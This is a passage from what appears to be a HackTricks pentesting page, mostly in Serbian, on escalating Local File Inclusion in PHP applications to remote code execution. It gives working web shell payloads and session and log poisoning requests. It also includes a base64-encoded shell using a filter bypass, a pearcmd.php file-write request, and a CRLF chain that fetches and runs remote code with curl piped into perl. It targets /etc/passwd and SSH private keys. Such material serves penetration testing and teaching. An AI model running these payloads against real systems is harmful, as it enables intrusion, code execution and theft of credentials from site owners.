Ako možete upload fajl, samo ubacite shell payload u njega (npr: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da bi fajl ostao čitljiv, najbolje je ubaciti metapodatke u slike/doc/pdf

### Putem slanja ZIP fajla

Otpremite ZIP fajl koji sadrži kompresovan PHP shell i pristupite:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Putem PHP sessions

Proverite da li web sajt koristi PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u ove sesije se čuvaju u _/var/lib/php5/sess\\_\[PHPSESSID]\_ datotekama
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavi cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Koristite LFI da uključite PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Putem ssh

Ako je ssh aktivan, proverite koji korisnik se koristi (/proc/self/status & /etc/passwd) i pokušajte da pristupite **\<HOME>/.ssh/id_rsa**

### **Putem** **vsftpd** _**logs**_

Logovi za FTP server vsftpd se nalaze u _**/var/log/vsftpd.log**_. U scenariju gde postoji Local File Inclusion (LFI) ranjivost i pristup izloženom vsftpd serveru je moguć, mogu se razmotriti sledeći koraci:

1. Injektujte PHP payload u polje username tokom login procesa.
2. Nakon injekcije, iskoristite LFI da dohvatite server logove iz _**/var/log/vsftpd.log**_.

### Putem php base64 filter (using base64)

Kao što je prikazano u [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) članku, PHP base64 filter jednostavno ignoriše Non-base64. To možete iskoristiti da zaobiđete proveru ekstenzije fajla: ako pošaljete base64 koji se završava sa ".php", on će jednostavno ignorisati "." i dodati "php" na base64. Evo primera payloada:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Preko php filters (nije potreban fajl)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Preko segmentation fault

**Upload** fajl koji će biti smešten kao privremeni u `/tmp`, zatim u **isti zahtev** izazovite **segmentation fault**, i tada privremeni fajl neće biti obrisan i možete ga potražiti.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Preko Nginx temp file storage

Ako pronađete **Local File Inclusion** i **Nginx** radi ispred PHP, možda ćete moći dobiti RCE ovom tehnikom:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Preko PHP_SESSION_UPLOAD_PROGRESS

Ako pronađete **Local File Inclusion** čak i ako **nemate sesiju** i `session.auto_start` je `Off`. Ako u **multipart POST** podacima pošaljete **`PHP_SESSION_UPLOAD_PROGRESS`**, PHP će **omogućiti sesiju za vas**. Ovo možete zloupotrebiti da dobijete RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Preko temp file uploads in Windows

Ako pronađete **Local File Inclusion** i server radi na **Windows**, možda možete dobiti RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Preko `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Sledeće zloupotrebljava CRLF vuln da bi omogućilo RCE (iz [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Putem phpinfo() (file_uploads = on)

Ako ste pronašli **Local File Inclusion** i fajl koji izlaže **phpinfo()** sa file_uploads = on, možete dobiti RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Putem compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ako ste pronašli **Local File Inclusion** i možete **exfiltrate the path** privremenog fajla ALI **server** proverava da li **fajl koji treba da bude uključen ima PHP marks**, možete pokušati da **bypass that check** ovom **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Putem eternal waiting + bruteforce

Ako možete zloupotrebiti LFI da **upload temporary files** i naterate server da **hang** PHP izvršenje, onda možete **brute force filenames during hours** da pronađete privremeni fajl:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Do Fatal Error

Ako uključite bilo koji od fajlova `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Morate uključiti isti fajl 2 puta da biste izazvali tu grešku).

**Ne znam koliko je ovo korisno, ali možda jeste.**\
_Čak i ako prouzrokujete PHP Fatal Error, PHP privremeni fajlovi koji su otpremljeni se brišu._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Reference

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
